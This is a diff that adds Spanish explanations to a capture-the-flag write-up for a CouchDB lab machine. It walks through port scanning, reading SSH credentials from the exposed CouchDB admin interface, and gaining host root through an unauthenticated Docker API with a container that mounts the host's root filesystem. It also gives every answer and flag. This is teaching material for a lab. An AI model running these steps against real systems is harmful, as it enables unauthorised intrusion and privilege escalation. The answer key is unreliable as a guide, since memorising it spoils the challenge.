@@ -17,6 +17,25 @@
 
 ### Task 1: Escaneo
 
+**Explicación:** Escaneo de puertos con nmap (el escaneo normal solo muestra 1 puerto; hay que usar RustScan para ver todos). El puerto 22 es SSH y el 5984 es CouchDB:
+
+```
+rustscan -a MACHINE_IP
+```
+
+```
+Open 10.10.75.191:22
+Open 10.10.75.191:5984
+```
+
+Acceder a CouchDB:
+
+```
+curl http://MACHINE_IP:5984
+```
+
+Devuelve la versión (1.6.1) y el OS (Ubuntu 16.04).
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Scan the machine. How many ports are open? | `2` |
@@ -26,6 +45,14 @@
 
 ### Task 2: Explotación de CouchDB
 
+**Explicación:** CouchDB tiene una interfaz de administración web llamada **Fauxton**:
+
+```
+http://MACHINE_IP:5984/_utils/#/dashboard
+```
+
+En la base de datos secreta, en el documento con id `a1320dd69fb4570d0a3d26df4e000be7`, hay un campo `passwordbackup` con las credenciales SSH: `atena:t4qfzcc4qN##`.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | What is the path for the web administration tool for this database management system? | `_utils` |
@@ -34,15 +61,51 @@
 
 ### Task 3: Acceso SSH
 
+**Explicación:** Con las credenciales obtenidas, conectar por SSH:
+
+```
+ssh atena@MACHINE_IP
+```
+
+En el directorio home está `user.txt`:
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Compromise the machine and locate user.txt | `THM{1ns3cure_couchdb}` |
 
+**Flag user:** `THM{1ns3cure_couchdb}` — "insecure couchdb" (couchdb inseguro).
+
 ### Task 4: Escalada de privilegios
+
+**Explicación:** Revisar `.bash_history` y `netstat` para descubrir que estamos en un contenedor Docker y que hay un puerto Docker API en `127.0.0.1:2375`:
+
+```
+netstat -lnt
+```
+
+```
+tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN
+```
+
+Hacer port forwarding del puerto 2375 a nuestra máquina local:
+
+```
+ssh -L 2375:127.0.0.1:2375 atena@MACHINE_IP
+```
+
+Escanear el puerto local y explotar la API de Docker sin autenticación para montar el filesystem raíz del host en un contenedor:
+
+```
+docker -H tcp://127.0.0.1:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
+```
+
+Esto da una shell como root en el host. Leer `root.txt`:
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Escalate privileges and obtain root.txt | `THM{RCE_us1ng_Docker_API}` |
+
+**Flag root:** `THM{RCE_us1ng_Docker_API}` — "RCE using Docker API" (ejecución remota de código usando la API de Docker).
 
 ---
 
